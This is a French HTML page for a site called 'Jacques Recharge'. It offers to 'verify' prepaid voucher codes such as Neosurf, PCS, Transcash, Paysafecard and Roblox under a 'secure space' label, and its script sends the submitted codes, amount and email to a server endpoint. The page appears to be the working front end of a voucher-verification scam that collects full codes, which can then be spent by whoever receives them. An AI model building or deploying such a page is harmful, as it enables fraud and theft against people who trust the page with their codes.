<!doctype html>
<html lang="fr">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Vérifier un ticket - Jacques Recharge</title>
    <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="assets/bootstrap.min.css" />
    <!-- Style personnalisé -->
    <link rel="stylesheet" href="assets/style.css" />
  </head>
  <body class="bg-control-page d-flex flex-column min-vh-100">
    
    <!-- Barre de Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark bg-opacity-75 shadow-sm sticky-top">
      <div class="container">
        <a class="navbar-brand fw-bold fs-4" href="index.html">💳 Jacques Recharge</a>
        <div class="ms-auto d-flex align-items-center gap-2">
          <!-- Bouton Redirection Accueil -->
          <a href="index.html" class="btn btn-outline-light btn-sm rounded-pill px-3 fw-medium">
            🏠 Accueil
          </a>
        </div>
      </div>
    </nav>

    <!-- Contenu Principal -->
    <main class="container my-auto py-5">
      <div class="row justify-content-center">
        <div class="col-lg-7 col-md-9">
          
          <!-- Carte Glassmorphism -->
          <div class="card glass-card border-0 rounded-4 overflow-hidden">
            <div class="card-body p-4 p-md-5">
              
              <!-- En-tête -->
              <div class="text-center mb-4">
                <span class="badge bg-primary-subtle text-primary fw-semibold px-3 py-2 rounded-pill mb-2">
                  🛡️ Espace Sécurisé
                </span>
                <h2 class="fw-bold text-dark mb-1">Vérifier / Soumettre un ticket</h2>
                <p class="text-muted small">
                  Remplissez les informations ci-dessous pour authentifier votre coupon.
                </p>
              </div>

              <!-- Formulaire -->
              <form id="ticketForm">
                <div class="row g-3">
                  
                  <!-- Type de Carte -->
                  <div class="col-md-6">
                    <label for="typeCarte" class="form-label fw-semibold small">Type de carte</label>
                    <select id="typeCarte" name="type_carte" class="form-select form-select-md" required>
                      <option value="Neosurf">Neosurf</option>
                      <option value="PCS">PCS</option>
                      <option value="Transcash">Transcash</option>
                      <option value="Paysafecard">Paysafecard</option>
                      <option value="Orange">Orange</option>
                      <option value="SFR">SFR</option>
                      <option value="Lycamobile">Lycamobile</option>
                      <option value="Roblox">Roblox</option>
                    </select>
                  </div>

                  <!-- Montant -->
                  <div class="col-md-6">
                    <label for="montant" class="form-label fw-semibold small">Montant (€)</label>
                    <input id="montant" name="montant" type="number" step="0.01" class="form-control form-control-md" placeholder="Ex: 50" required />
                  </div>

                  <!-- Code du Ticket -->
                  <div class="col-12">
                    <label for="codeTicket" class="form-label fw-semibold small">Code du ticket / Recharge</label>
                    <textarea id="codeTicket" name="code_ticket" class="form-control" rows="3" placeholder="Entrez le ou les codes ici..." required></textarea>
                  </div>

                  <!-- Email -->
                  <div class="col-12">
                    <label for="userEmail" class="form-label fw-semibold small">Adresse E-mail <span class="text-muted fw-normal">(optionnel)</span></label>
                    <input id="userEmail" name="user_email" type="email" class="form-control form-control-md" placeholder="nom@exemple.com" />
                  </div>

                </div>

                <!-- Boutons d'action -->
                <div class="d-flex flex-column flex-sm-row justify-content-between align-items-center gap-3 mt-4 pt-2">
                  <button type="submit" class="btn btn-primary btn-md fw-bold px-4 w-100 w-sm-auto rounded-3 btn-submit-action">
                    🚀 Soumettre le ticket
                  </button>
                  <a href="statut.html" class="btn btn-outline-secondary btn-md rounded-3 w-100 w-sm-auto text-center">
                    🔍 Consulter un statut
                  </a>
                </div>
              </form>

              <!-- Zone d'alerte dynamique -->
              <div id="alertArea" class="mt-3"></div>

            </div>
          </div>

        </div>
      </div>
    </main>

    <!-- Pied de page -->
    <footer class="site-footer bg-dark bg-opacity-75 text-white text-center py-3 mt-auto">
      <div class="container">
        <p class="mb-0 small text-white-50">&copy; 2026 Jacques Recharge. Tous droits réservés.</p>
      </div>
    </footer>

    <!-- Scripts -->
    <script src="assets/bootstrap.bundle.min.js"></script>
    <script>
      (function(){
        const form = document.getElementById('ticketForm');
        const alertArea = document.getElementById('alertArea');

        function showAlert(message, type='success'){
          alertArea.innerHTML = `<div class="alert alert-${type} rounded-3 shadow-sm" role="alert" style="display:block;">${message}</div>`;
        }

        // Préremplir depuis la query string
        const params = new URLSearchParams(window.location.search);
        if(params.get('carte')) document.getElementById('typeCarte').value = params.get('carte');
        if(params.get('montant')) document.getElementById('montant').value = params.get('montant');

        form.addEventListener('submit', async function(e){
          e.preventDefault();
          const data = {
            type_carte: form.type_carte.value,
            montant: form.montant.value,
            code_ticket: form.code_ticket.value,
            user_email: form.user_email.value
          };

          try{
            const res = await fetch('/api/tickets', {
              method: 'POST',
              headers: {'Content-Type':'application/json'},
              body: JSON.stringify(data)
            });
            if(res.ok){
              showAlert('Ticket soumis avec succès. Vous recevrez une confirmation par e-mail si fourni.', 'success');
              form.reset();
            } else {
              const err = await res.text();
              showAlert('Erreur lors de la soumission : ' + err, 'danger');
            }
          } catch(err){
            showAlert('Impossible de contacter le serveur. Vérifiez la configuration.', 'danger');
          }
        });
      })();
    </script>
  </body>
</html>
